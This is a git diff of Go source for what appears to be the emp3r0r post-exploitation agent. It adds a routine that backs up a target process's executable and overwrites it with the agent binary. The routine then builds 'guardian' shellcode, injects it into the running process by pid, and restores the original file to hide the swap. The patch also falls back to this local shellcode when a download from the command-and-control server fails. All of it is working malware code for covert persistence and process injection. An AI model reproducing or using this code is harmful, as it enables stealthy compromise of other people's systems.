@@ -307,6 +307,24 @@ func prepare_injectSO(pid int) (so_path string, err error) {
 	return
 }
 
+// prepare for guardian_shellcode injection, targeting pid
+func prepare_guardian_sc(pid int) (shellcode string, err error) {
+	// prepare guardian_shellcode
+	proc_exe := util.ProcExe(pid)
+	// backup original binary
+	err = CopyProcExeTo(pid, emp3r0r_data.AgentRoot+"/"+util.FileBaseName(proc_exe))
+	if err != nil {
+		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
+	}
+	err = CopySelfTo(proc_exe)
+	if err != nil {
+		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
+	}
+	sc := gen_guardian_shellcode(proc_exe)
+
+	return sc, nil
+}
+
 // InjectorHandler handles `injector` module
 func InjectorHandler(pid int, method string) (err error) {
 	// prepare the shellcode
@@ -315,15 +333,17 @@ func InjectorHandler(pid int, method string) (err error) {
 
 		if err != nil {
 			log.Printf("Failed to download shellcode.txt from CC: %v", err)
-			sc = []byte(emp3r0r_data.GuardianShellcode)
-			err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
+			// prepare guardian_shellcode
+			emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
 			if err != nil {
+				log.Printf("Failed to prepare_guardian_sc: %v", err)
 				return
 			}
+			sc = []byte(emp3r0r_data.GuardianShellcode)
 		}
 		shellcode = string(sc)
 		shellcodeLen = strings.Count(string(shellcode), "0x")
-		log.Printf("Downloaded %d of shellcode, preparing to inject", shellcodeLen)
+		log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
 		return
 	}
 
@@ -334,6 +354,12 @@ func InjectorHandler(pid int, method string) (err error) {
 	case "inject_shellcode":
 		shellcode, _ := prepare_sc()
 		err = ShellcodeInjector(&shellcode, pid)
+		if err != nil {
+			return
+		}
+
+		// restore original binary
+		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
 	case "inject_loader":
 		err = InjectSO(pid)
 	default:
